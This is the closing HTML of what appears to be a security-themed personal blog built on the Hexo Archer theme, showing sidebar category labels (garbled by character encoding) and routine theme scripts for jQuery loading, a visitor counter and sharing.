        <span class="sidebar-category-name" data-categories="ä»£ç å®¡è®¡"><span class="iconfont-archer">&#xe60a;</span>ä»£ç å®¡è®¡</span>
    
        <span class="sidebar-category-name" data-categories="æ“ä½œç³»ç»Ÿ"><span class="iconfont-archer">&#xe60a;</span>æ“ä½œç³»ç»Ÿ</span>
    
        <span class="sidebar-category-name" data-categories="å®¹å™¨æŠ€æœ¯"><span class="iconfont-archer">&#xe60a;</span>å®¹å™¨æŠ€æœ¯</span>
    
        <span class="sidebar-category-name" data-categories="è¿ç»´çŸ¥è¯†"><span class="iconfont-archer">&#xe60a;</span>è¿ç»´çŸ¥è¯†</span>
    
        <span class="sidebar-category-name" data-categories="Web-Security"><span class="iconfont-archer">&#xe60a;</span>Web-Security</span>
    
        <span class="sidebar-category-name" data-categories="ååºåˆ—åŒ–"><span class="iconfont-archer">&#xe60a;</span>ååºåˆ—åŒ–</span>
    
    </div>
    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
    <div class="sidebar-categories-list"></div>
</div>
    </div>
</div> 
    <script>
    var siteMeta = {
        root: "/",
        author: "m0nk3y"
    }
</script>
    <!-- CDN failover -->
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
    <script type="text/javascript">
        if (typeof window.$ === 'undefined')
        {
            console.warn('jquery load from jsdelivr failed, will load local script')
            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
        }
    </script>
    <script src="/scripts/main.js"></script>
    <!-- algolia -->
    
    <!-- busuanzi  -->
    
    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    
    <!-- CNZZ  -->
    
    </div>
    <!-- async load share.js -->
    
        <script src="/scripts/share.js" async></script>    
     
    </body>
</html>


